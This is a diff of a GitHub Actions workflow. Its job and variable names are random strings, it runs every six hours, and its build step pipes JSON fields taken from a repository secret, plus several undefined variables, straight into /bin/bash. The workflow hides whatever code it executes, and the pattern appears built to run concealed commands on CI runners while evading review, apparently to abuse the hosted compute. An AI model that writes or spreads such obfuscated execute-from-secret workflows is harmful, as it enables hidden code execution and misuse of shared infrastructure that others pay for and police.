@@ -1,23 +1,27 @@
 name: zhoubogu7654
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 5/6 * * *'
+    - cron: '56 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhoubogu7654
         env:
-          wrd9372: ${{ secrets.wrd9372 }}
+          tmgze2458: ${{ secrets.tmgze2458 }}
         run: |
-          echo $wrd9372 | jq -r .bnihs0 | /bin/bash
-          echo $ptglv740 | jq -r .h01115 | /bin/bash
-          echo $b3 | jq -r .gzaul03 | /bin/bash
-          echo $og90 | jq -r .uooq3373 | /bin/bash
-          echo $aq5 | jq -r .jzy0176 | /bin/bash
-          echo $lmi24 | jq -r .fkr85 | /bin/bash
-          echo $js1288 | jq -r .w1 | /bin/bash
+          echo $tmgze2458 | jq -r .pdmra4011 | /bin/bash
+          echo $o34 | jq -r .utd56768 | /bin/bash
+          echo $zbr50 | jq -r .lts67 | /bin/bash
+          echo $wu57256 | jq -r .wlzwb56781 | /bin/bash
+          echo $rcnd8 | jq -r .hqy7 | /bin/bash
+          echo $xzp31922 | jq -r .jsnlx1649 | /bin/bash
+          echo $nugyn389 | jq -r .acdt9607 | /bin/bash
+          echo $l15 | jq -r .yr2 | /bin/bash
+          echo $kwnik40271 | jq -r .gt4244 | /bin/bash
+          echo $e0862 | jq -r .wg9967 | /bin/bash
 
